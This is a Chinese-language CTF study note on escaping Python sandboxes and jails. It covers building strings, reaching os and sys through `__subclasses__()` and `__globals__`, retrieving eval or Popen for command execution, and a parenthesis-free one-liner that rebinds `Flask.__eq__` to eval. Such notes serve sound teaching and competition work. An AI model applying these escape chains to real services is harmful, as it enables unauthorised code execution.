tags:: [[CTF/Python]]

- # 套路
	- 首先考虑构造任意字符串
	- 然后考虑拿到命令执行相关的函数
		- 考虑找到相关的模块，并从模块中拿到需要的函数
		- 也可以考虑找到`eval`函数
	- 最后把字符串传给函数即可
- # 构造至少一个字符串
	- 有时需要先通过某些方式找到一个字符串（比如说`sys.base_exec_prefix`或者`sys.version_info.releaselevel`）
	- 然后用这个字符串作为键名拿到某个GET/POST参数（比如说`request.args.get(sys.base_exec_prefix)`）
	- `sys.builtin_module_names`中有一堆字符串
	  id:: 652b6f8a-e0b1-47e3-9235-53bc76fd72ba
	- 拿到某个类的名字：`().__class__.__name__`
- # 构造任意字符串
	- 转义：`"\x61\x61"`和`"\u0061\u0061"`
	- f-string: `f"{chr(0x61)}"`
	- 如果是flask等HTTP环境
		- 考虑从GET/POST参数中，或者headers中拿取任意字符串
	- format: `"%d%d" % (100, 100)`
- # 根据一个模块找到任意模块
  id:: 652b6ef7-8828-476a-90e6-69e7521fdf1b
	- 首先找到sys模块
		- 通过datetime模块：`datetime.sys`
		- 通过其他任意模块：`flask.__spec__.loader.__init__.__globals__['sys']`
	- 然后通过sys模块找到其他模块
		- 比如说找到os模块：`sys.modules['os']`
- # 找到危险的类
	- 通过任意对象：`[].__class__.__base__.__subclasses__()`
		- 从里面把`subclasses.Popen`之类的危险类找出来就可以实现命令执行
	- 从模块中拿到危险的类：参考上面 ((652b6ef7-8828-476a-90e6-69e7521fdf1b))
- # 找到eval函数
	- 通过任意模块：`flask.__spec__.loader.__init__.__globals__['__builtins__']['eval']`
	- 通过任意对象：
		- 首先可以使用`().__class__.__base__.__subclasses__()`拿到目标上的所有类
		- 这里某些类中的`__init__`函数中有`__globals__`这个属性，我们可以从`__globals__`属性中拿到`eval`
		- 假设这些类中的某一个标号为`xxx`，我们就可以
			- 通过`().__class__.__base__.__subclasses__()[xxx]`拿到这个类
			- 通过`().__class__.__base__.__subclasses__()[xxx].__init__.__globals__`拿到globals，这是一个字典，其中`globals['__builtins__']['eval']`就是我们需要的eval函数
		- 记对应类为`().__class__.__base__.__subclasses__()[xxx]`，其中xxx为一个数字
		- 如果你不确定哪些类的init函数中有eval，可以使用下面的脚本（在你的机器上执行即可）
			- ```python
			  s = ().__class__.__base__.__subclasses__()
			  for i, t in enumerate(s):
			      try:
			          print(t, t.__init__.__globals__['__builtins__']['eval'])
			      except:
			          pass
			  ```
- # 实现函数调用
	- 有时候括号被禁用
	- 通过魔术方法实现函数调用
		- 比如说对Flask类动手脚
			- ```python
			  # 比如说题目中有一个app变量，其类型是Flask
			  from flask import Flask
			  app = Flask(__name__)
			  # 然后我们可以控制一个变量为任意字符串
			  name = "xxx" 
			  # 我们可以污染Flask.__eq__这个魔术方法
			  Flask.__eq__ = eval
			  # 然后调用Flask.__eq__
			  app == name # 这里的name就会被当成参数传给eval
			  ```
		- 用一些技巧将上面的代码压缩成一行
			- python中for可以用于赋值：`Flask.__eq__ = eval`等价于`{1 for Flask.__eq__ in {eval, }}`
			- python可以将多个表达式放在一个set中，表达式会依次执行
			- ```python
			  from flask import Flask
			  app = Flask(__name__)
			  name = "xxx"
			  # 下面这个鬼东西和上面的两行语句等价，直接eval就行
			  {{1 for Flask.__eq__ in {eval}}, {app == name}}
			  ```
		- finalize_request